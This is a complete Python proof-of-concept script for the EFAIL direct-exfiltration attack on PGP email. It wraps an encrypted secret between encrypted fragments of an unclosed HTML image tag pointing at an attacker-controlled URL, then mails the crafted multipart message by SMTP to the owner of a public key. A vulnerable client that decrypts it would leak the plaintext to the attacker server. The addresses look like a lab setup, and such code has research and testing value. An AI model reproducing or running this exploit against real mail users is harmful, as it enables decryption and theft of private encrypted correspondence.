#!/usr/bin/env -S uv run --with pgpy
"""
Send a multipart/mixed EFAIL direct exfiltration message to the owner of
../pgp1-intern-pub.asc.

Encrypts to ../pgp1-intern-pub.asc.

Edit ATTACKER_URL / PLAINTEXT / SUBJECT below if needed, then run:
  ./efail-direct-pgp.py
"""

import re
import smtplib
import os
from pathlib import Path
from email.utils import formatdate

# Attacker-controlled server that will receive the decrypted plaintext as a URL path.
# Replace with a host you control and can observe requests on (e.g. netcat, requestbin).
ATTACKER_URL = "http://10.0.2.1:8000"

import pgpy

# --- config (no CLI) ---
SMTP_HOST = "10.0.2.2"
SMTP_PORT = 25
SENDER = "plain@external.test"
SUBJECT = "EFAIL: PGP direct variant"
PLAINTEXT = "Hello from pgpy"

SCRIPT_DIR = Path(__file__).resolve().parent
PUBKEY_PATH = (SCRIPT_DIR / "../pgp1-intern-pub.asc").resolve()


def load_public_key(key_path: Path) -> pgpy.PGPKey:
    key_data = key_path.read_text(encoding="utf-8")
    key, _ = pgpy.PGPKey.from_blob(key_data)

    if key.is_public is False:
        raise ValueError(f"Expected a public key at {key_path}, got private key material")

    return key


def recipient_email_from_key(public_key: pgpy.PGPKey) -> str:
    """Resolve envelope/header recipient from the key's primary user ID (owner)."""
    for uid in public_key.userids:
        email = getattr(uid, "email", None)
        if email:
            return str(email).strip()
    for uid in public_key.userids:
        text = uid.userid
        m = re.search(r"<\s*([^>\s]+)\s*>", text)
        if m:
            return m.group(1).strip()
    raise ValueError(
        f"No email found in user IDs of {PUBKEY_PATH}; add a UID with an email to the key."
    )


def encrypt_inline(
    plaintext: str,
    recipient_pubkey: pgpy.PGPKey,
) -> str:
    """Encrypt plaintext to ``recipient_pubkey`` and return ASCII-armored ciphertext."""
    pgp_message = pgpy.PGPMessage.new(plaintext, cleartext=False)
    encrypted = recipient_pubkey.encrypt(pgp_message)
    return str(encrypted)

def main() -> None:
    public_key = load_public_key(PUBKEY_PATH)
    recipient = recipient_email_from_key(public_key)
    secret = encrypt_inline("secret message: " + os.urandom(10).hex(), public_key)

    armored1 = encrypt_inline(f"""--separator2--

--separator1
Content-Type: text/html
Content-Disposition: inline

<html>
<body>
<img src="{ATTACKER_URL}/
""", public_key)
    armored2 = encrypt_inline("""
" />
</body>
</html>
""", public_key)

    msg = f"""From: {SENDER}
To: {recipient}
Subject: inline PGP test
Date: {formatdate(localtime=True)}
Content-Type: multipart/mixed; boundary="separator1"

--separator1
Content-Type: multipart/mixed; boundary="separator2"

--separator2
Content-Type: text/html; name="empty.html.pgp"
Content-Disposition: attachment
Content-Transfer-Encoding: 8bit

{armored1}

--separator2
Content-Type: application/octet-stream; name="foo2.pgp"
Content-Transfer-Encoding: 8bit

{secret}

--separator2
Content-Type: text/html; name="foo3.pgp"
Content-Transfer-Encoding: 8bit

{armored2}

--separator2--
--separator1--
"""

    with smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=30) as smtp:
            smtp.sendmail(SENDER, [recipient], msg.encode())


if __name__ == "__main__":
    main()
